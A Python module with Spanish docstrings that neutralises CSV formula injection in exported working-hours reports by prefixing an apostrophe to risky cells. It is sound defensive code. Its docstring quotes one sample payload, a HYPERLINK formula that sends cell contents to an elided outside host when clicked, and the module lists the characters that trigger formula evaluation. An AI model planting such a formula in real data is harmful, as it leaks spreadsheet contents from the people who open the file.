"""Escribir CSV que no se convierta en programa al abrirlo.

Un CSV se entrega para que alguien lo abra, y quien lo abre usa Excel o
LibreOffice. Los dos evalúan como **fórmula** cualquier celda que empiece por
`=`, `+`, `-` o `@`: `=HYPERLINK("http://…"&A1,"pincha")` en un nombre convierte
el informe de jornada en algo que filtra el resto de la hoja al primer clic.

Las comillas del CSV no protegen de esto. Son de la sintaxis del fichero: el
programa las quita al leer y evalúa lo que había dentro, que es exactamente lo
mismo que si no hubieran estado.

Aquí importa más que en un CSV cualquiera por dos motivos:

- **El destinatario es la Inspección o la gestoría.** No es un fichero que uno se
  descarga para sí: es el documento con el que la empresa responde.
- **Parte del texto lo escribe la persona trabajadora.** La discrepancia del art.
  4.b es texto libre y viaja al informe por diseño ---es el derecho que ese
  artículo protege--- así que no se puede sanear quitándola. Y el rastro de
  auditoría lleva `actor_label`, que en una integración lo pone el conector.

La neutralización estándar es anteponer un apóstrofo. Excel y LibreOffice lo
entienden como «esto es texto» y no lo muestran; en un editor de texto plano se
ve, que es el precio de que la celda no se ejecute. Solo se toca lo que empieza
por uno de esos caracteres: un nombre corriente sale intacto.
"""

from __future__ import annotations

import csv

#: Lo que Excel y LibreOffice tratan como principio de fórmula. La tabulación y
#: el retorno entran porque un valor que empieza por ellos deja el siguiente
#: carácter al principio de la celda, y entonces vale el mismo truco.
ARRANQUES_PELIGROSOS = ("=", "+", "-", "@", "\t", "\r")


def celda_segura(valor) -> str:
    """El valor tal cual, salvo que empiece como una fórmula."""
    texto = "" if valor is None else str(valor)
    if texto[:1] in ARRANQUES_PELIGROSOS:
        return "'" + texto
    return texto


class EscritorSeguro:
    """`csv.writer` con las celdas neutralizadas.

    Envuelto en vez de saneado en cada `writerow` porque los dos exportadores
    del producto escriben decenas de filas y basta olvidarse en una: el que
    escribe la fila no tiene que acordarse de nada.
    """

    def __init__(self, fichero, **opciones):
        self._writer = csv.writer(fichero, **opciones)

    def writerow(self, fila) -> None:
        self._writer.writerow([celda_segura(c) for c in fila])

    def writerows(self, filas) -> None:
        for fila in filas:
            self.writerow(fila)
